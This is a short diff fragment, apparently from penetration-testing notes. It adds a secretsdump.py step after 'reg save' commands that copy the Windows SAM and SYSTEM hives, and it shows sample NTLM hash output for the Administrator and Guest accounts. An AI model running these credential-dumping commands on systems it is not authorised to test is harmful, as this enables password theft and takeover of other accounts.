@@ -1632,6 +1632,9 @@ reg save hklm\sam c:\sam
 reg save hklm\system c:\system
 ````
 ````
+secretsdump.py -sam sam -system system local
+````
+````
 cat hashes.sam    
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:a8c8b7a37513b7eb9308952b814b522b:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
